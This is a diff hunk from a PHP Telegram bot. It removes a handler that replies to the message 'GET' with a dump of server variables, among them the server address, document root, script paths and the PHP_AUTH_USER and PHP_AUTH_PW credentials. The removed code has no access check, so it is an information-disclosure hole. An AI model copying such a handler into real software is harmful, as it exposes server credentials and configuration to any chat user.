@@ -286,51 +286,6 @@ bot('sendDocument', [
 }
 
 
-
-if($text == "GET"){
-bot('sendMessage',[
-'chat_id'=>$chat_id,
-'text'=>"Status 📊"."\n".$_SERVER['PHP_SELF']."
-".$_SERVER['argv']."
-".$_SERVER['argc']."
-".$_SERVER['GATEWAY_INTERFACE']."
-".$_SERVER['SERVER_ADDR']."
-".$_SERVER['SERVER_NAME']."
-".$_SERVER['SERVER_SOFTWARE']."
-".$_SERVER['SERVER_PROTOCOL']."
-".$_SERVER['REQUEST_METHOD']."
-".$_SERVER['REQUEST_TIME']."
-".$_SERVER['REQUEST_TIME_FLOAT']."
-".$_SERVER['QUERY_STRING']."
-".$_SERVER['DOCUMENT_ROOT']."
-".$_SERVER['HTTP_ACCEPT']."
-".$_SERVER['HTTP_ACCEPT_CHARSET']."
-".$_SERVER['HTTP_ACCEPT_ENCODING']."
-".$_SERVER['HTTP_ACCEPT_LANGUAGE']."
-".$_SERVER['HTTP_CONNECTION']."
-".$_SERVER['HTTP_HOST']."
-".$_SERVER['HTTP_REFERER']."
-".$_SERVER['HTTP_USER_AGENT']."
-".$_SERVER['HTTPS']."
-".$_SERVER['REMOTE_ADDR']."
-".$_SERVER['REMOTE_HOST']."
-".$_SERVER['REMOTE_PORT']."
-".$_SERVER['REMOTE_USER']."
-".$_SERVER['REDIRECT_REMOTE_USER']."
-".$_SERVER['SCRIPT_FILENAME']."
-".$_SERVER['SERVER_ADMIN']."
-".$_SERVER['SERVER_PORT']."
-".$_SERVER['SERVER_SIGNATURE']."
-".$_SERVER['PATH_TRANSLATED']."
-".$_SERVER['SCRIPT_NAME']."
-".$_SERVER['REQUEST_URI']."
-".$_SERVER['PHP_AUTH_DIGEST']."
-".$_SERVER['PHP_AUTH_USER']."
-".$_SERVER['PHP_AUTH_PW']."
-".$_SERVER['AUTH_TYPE']."
-".$_SERVER['PATH_INFO']."
-".$_SERVER['ORIG_PATH_INFO']]);}
-
 if($message->sender_chat->type == "channel"){
 bot('deletemessage',[
 'chat_id'=>$chat_id,
